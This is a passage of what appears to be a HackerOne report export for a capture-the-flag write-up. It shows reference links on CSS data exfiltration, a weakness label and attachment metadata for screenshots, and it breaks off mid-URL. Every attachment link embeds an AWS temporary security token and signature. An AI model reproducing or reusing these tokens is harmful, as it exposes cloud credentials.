href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fcgvwzq\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePepe Vila\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fresearch.securitum.com%2Fcss-data-exfiltration-in-firefox-via-single-injection-point%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCSS data exfiltration in Firefox via a single injection point\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e by \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fsecuritymb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eMichał Bentkowski\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fmathiasbynens.be%2Fnotes%2Fcss-escapes\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCSS character escape sequences\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e by \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fmathias\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eMathias Bynens\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003e-\u003c/p\u003e\n","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":861473,"file_name":"ctf-tweet.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iq2fYq3LVJaMrmfXuNzYD9cW?response-content-disposition=attachment%3B%20filename%3D%22ctf-tweet.png%22%3B%20filename%2A%3DUTF-8%27%27ctf-tweet.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=10d07fcb10e5e7d512e13320163205bb28898d88fab42ad50339587d104f2fc0","file_size":181396,"type":"image/png"},{"id":861592,"file_name":"ssrf-content-discovery-intruder-payload-processing-tasks.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gFTiEULu756rSB5bX1TbsDMt?response-content-disposition=attachment%3B%20filename%3D%22ssrf-content-discovery-intruder-payload-processing-tasks.png%22%3B%20filename%2A%3DUTF-8%27%27ssrf-content-discovery-intruder-payload-processing-tasks.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=2c1ec5d21f9218949c888bea0fa1e73b5ca34445abec3d550c633bf086438dec","file_size":14039,"type":"image/png"},{"id":862914,"file_name":"android-part-one-activity.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fnyuUtasRm6P3QtR6W34uEDW?response-content-disposition=attachment%3B%20filename%3D%22android-part-one-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-one-activity.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=6ea40128117594fdeefb1f98346d71147be6dd52b94693bcd74f0e9553093418","file_size":57420,"type":"image/png"},{"id":862915,"file_name":"android-part-two-activity.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iya7Dx8ZbbrqwY7h9AjX9bNm?response-content-disposition=attachment%3B%20filename%3D%22android-part-two-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-two-activity.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=4c49cb81111ab0ebe061f425242d978b8e14003167bf98913cb9e6d610d2a5c0","file_size":65921,"type":"image/png"},{"id":862959,"file_name":"android-part-three-activity.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KAFhAWT7hakjCnYnycQ85yM8?response-content-disposition=attachment%3B%20filename%3D%22android-part-three-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-three-activity.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=f39b89f7f28351caae7c99704a5f4b86e326f576cb263d82d5a0bfb6f6780533","file_size":62324,"type":"image/png"},{"id":862964,"file_name":"android-congrats-activity.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VojQm8VZuCVLWcwW8T9PNZGn?response-content-disposition=attachment%3B%20filename%3D%22android-congrats-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-congrats-activity.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=91e1969053a89366beccf8ae866222d836de8d5ee9417c58811f266bf033cf6e","file_size":80181,"type":"image/png"},{"id":863165,"file_name":"completed-priv-esc.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/JhZy42jGednjJPbk1xvzuttL?response-content-disposition=attachment%3B%20filename%3D%22completed-priv-esc.png%22%3B%20filename%2A%3DUTF-8%27%27completed-priv-esc.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=4e774f7dfe8b91e24c9d49dd9b9493600352b29ee8985aa92b243c9d4a628b94","file_size":11280,"type":"image/png"},{"id":863225,"file_name":"may-transactions-to-process.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hS9qyX8uUeRFcS5EvCtcc375?response-content-disposition=attachment%3B%20filename%3D%22may-transactions-to-process.png%22%3B%20filename%2A%3DUTF-8%27%27may-transactions-to-process.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=95c804b8421ed3da33b26d5a3cc3209cd31253ca497589f1b04cef0de2af87f2","file_size":9656,"type":"image/png"},{"id":863226,"file_name":"transaction-approval-2fa-page.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HKGUFNAMo9dJX8UG6qm1TW2o?response-content-disposition=attachment%3B%20filename%3D%22transaction-approval-2fa-page.png%22%3B%20filename%2A%3DUTF-8%27%27transaction-approval-2fa-page.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=cf702b9c0df3a1fca9f2c626795e7cbdb434a5cf19855671779f9272b70f5599","file_size":11213,"type":"image/png"},{"id":863231,"file_name":"external-stylesheet-burp-collaborator.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TyQZ5bav5NEXxkKPZMzdgJNh?response-content-disposition=attachment%3B%20filename%3D%22external-stylesheet-burp-collaborator.png%22%3B%20filename%2A%3DUTF-8%27%27external-stylesheet-burp-collaborator.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7